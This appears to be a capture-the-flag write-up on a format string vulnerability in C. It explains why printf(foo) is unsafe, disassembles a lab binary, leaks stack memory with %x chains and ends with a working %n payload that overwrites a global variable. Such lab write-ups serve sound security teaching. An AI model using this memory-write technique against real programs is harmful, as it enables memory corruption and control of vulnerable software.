If no argument being specified, whilst there is the format specifiers, then the format specifiers will be used by the user to leaked the memory, potentially write to memory when using %n.

> Code  such  as  printf(foo);  often indicates a bug, since foo may contain a % character.  If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.

We can rephrase it maybe like "if foo contains any % characters and they aren't meant to be format specifiers, the program could crash or behave unpredictably. This is especially problematic if foo comes from user input, as a user could intentionally insert format specifiers".

Consider this simple example:
```c
char *foo = "Hello, %p!";
printf(foo);  // Bug: There's no argument for %p
```
when compile the program, it will produce a warning:
```bash
$ gcc test.c -o test
test.c: In function ‘main’:
test.c:6:9: warning: format not a string literal and no format arguments [-Wformat-security]
    6 |         printf(foo);  // Bug: There's no argument for %p
      |         ^~~~~~
```
try to run the program:
```bash
 ./test 
Hello, 0x7ffed437ce08!
```
well it leaks something, and that is bad. 

```as
(gdb) disas vuln
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:	push   ebp
0x080483f5 <vuln+1>:	mov    ebp,esp
0x080483f7 <vuln+3>:	sub    esp,0x18
0x080483fa <vuln+6>:	mov    eax,DWORD PTR [ebp+0x8]
0x080483fd <vuln+9>:	mov    DWORD PTR [esp],eax
0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
0x08048405 <vuln+17>:	mov    eax,ds:0x8049638
0x0804840a <vuln+22>:	test   eax,eax
0x0804840c <vuln+24>:	je     0x804841a <vuln+38>
0x0804840e <vuln+26>:	mov    DWORD PTR [esp],0x8048500 ;"you have modified the target :)"
0x08048415 <vuln+33>:	call   0x8048330 <puts@plt>
0x0804841a <vuln+38>:	leave  
0x0804841b <vuln+39>:	ret    
End of assembler dump.
```
Back to the challenge, we are supposed to modify the global variable `target` to win the challenge. In assembly `target` is shown in instruction `<vuln+17>:mov eax,ds:0x8049638`.

Since we know `printf` allows us to specify anything, then we can try to leak something in the memory:
```bash
$ ./format1 "`python -c "print('%x '*200)"`"
804960c bffff588 8048469 b7fd8304 b7fd7ff4 bffff588 8048435 bffff754 b7ff1040 804845b b7fd7ff4 8048450 0 bffff608 b7eadc76 2 bffff634 bffff640 b7fe1848 bffff5f0 ffffffff b7ffeff4 804824d 1 bffff5f0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff608 1e83e0c7 34d0b6d7 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff634 8048450 8048440 b7ff1040 bffff62c b7fff8f8 2 bffff74a bffff754 0 bffff9ad bffff9bb bffff9cf bffff9f2 bffffa05 bffffa0f bffffeff bfffff3d bfffff51 bfffff68 bfffff79 bfffff81 bfffff91 bfffff9e bfffffd4 bfffffe6 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff72b 1f bffffff2 f bffff73b 0 0 0 45000000 6099d3fa f8dc70b4 a157f3f5 69743615 363836 0 0 2f2e0000 6d726f66 317461 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 
```

Appearing 
```bash
$ ./format1 "$(python -c "print('\x38\x96\x04\x08'+'%x '*130+'%x')")" | grep --color=always -e "^" -e "8049638"
8804960c bffff658 8048469 b7fd8304 b7fd7ff4 bffff658 8048435 bffff820 b7ff1040 804845b b7fd7ff4 8048450 0 bffff6d8 b7eadc76 2 bffff704 bffff710 b7fe1848 bffff6c0 ffffffff b7ffeff4 804824d 1 bffff6c0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6d8 aa95d5ce 80c163de 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff704 8048450 8048440 b7ff1040 bffff6fc b7fff8f8 2 bffff816 bffff820 0 bffff9ad bffff9bb bffff9cf bffff9f2 bffffa05 bffffa0f bffffeff bfffff3d bfffff51 bfffff68 bfffff79 bfffff81 bfffff91 bfffff9e bfffffd4 bfffffe6 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7fb 1f bffffff2 f bffff80b 0 0 0 5d000000 8a105697 858aabc dbd443f1 691cebca 363836 0 2f2e0000 6d726f66 317461 8049638 25207825 78252078 20782520
```

Not appearing
```bash
$ ./format1 "$(python -c "print('\x38\x96\x04\x08'+'%x '*132+'%x')")" | grep --color=always -e "^" -e "8049638"
8804960c bffff658 8048469 b7fd8304 b7fd7ff4 bffff658 8048435 bffff81a b7ff1040 804845b b7fd7ff4 8048450 0 bffff6d8 b7eadc76 2 bffff704 bffff710 b7fe1848 bffff6c0 ffffffff b7ffeff4 804824d 1 bffff6c0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6d8 ff84a060 d5d01670 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff704 8048450 8048440 b7ff1040 bffff6fc b7fff8f8 2 bffff810 bffff81a 0 bffff9ad bffff9bb bffff9cf bffff9f2 bffffa05 bffffa0f bffffeff bfffff3d bfffff51 bfffff68 bfffff79 bfffff81 bfffff91 bfffff9e bfffffd4 bfffffe6 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7fb 1f bffffff2 f bffff80b 0 0 0 2000000 3081544d 5b8f8034 cd8fb0c2 69581ca4 363836 6f662f2e 74616d72 96380031 78250804 20782520 25207825 78252078 20782520 25207825 78252078
```

```bash
$ ./format1 "$(python -c "print('\x38\x96\x04\x08'+'%x '*126+'%x')")" | grep --color=always -e "^" -e "8049638"
8804960c bffff668 8048469 b7fd8304 b7fd7ff4 bffff668 8048435 bffff82c b7ff1040 804845b b7fd7ff4 8048450 0 bffff6e8 b7eadc76 2 bffff714 bffff720 b7fe1848 bffff6d0 ffffffff b7ffeff4 804824d 1 bffff6d0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6e8 4fd66ecf 6582f8df 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff714 8048450 8048440 b7ff1040 bffff70c b7fff8f8 2 bffff822 bffff82c 0 bffff9ad bffff9bb bffff9cf bffff9f2 bffffa05 bffffa0f bffffeff bfffff3d bfffff51 bfffff68 bfffff79 bfffff81 bfffff91 bfffff9e bfffffd4 bfffffe6 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff80b 1f bffffff2 f bffff81b 0 0 0 b7000000 47a2ecef 9ed8581d 96f3b2d1 69bef39e 363836 2f2e0000 6d726f66 317461 8049638
```

Finally
```bash
$ ./format1 "$(python -c "print('\x38\x96\x04\x08'+'%x '*126+'%n')")" | grep --color=always -e "^" -e "8049638"
8804960c bffff668 8048469 b7fd8304 b7fd7ff4 bffff668 8048435 bffff82c b7ff1040 804845b b7fd7ff4 8048450 0 bffff6e8 b7eadc76 2 bffff714 bffff720 b7fe1848 bffff6d0 ffffffff b7ffeff4 804824d 1 bffff6d0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6e8 ad7e2f43 872ab953 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff714 8048450 8048440 b7ff1040 bffff70c b7fff8f8 2 bffff822 bffff82c 0 bffff9ad bffff9bb bffff9cf bffff9f2 bffffa05 bffffa0f bffffeff bfffff3d bfffff51 bfffff68 bfffff79 bfffff81 bfffff91 bfffff9e bfffffd4 bfffffe6 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff80b 1f bffffff2 f bffff81b 0 0 0 35000000 67552a87 b31e2949 e4c4a040 69bde701 363836 2f2e0000 6d726f66 317461 you have modified the target :)
```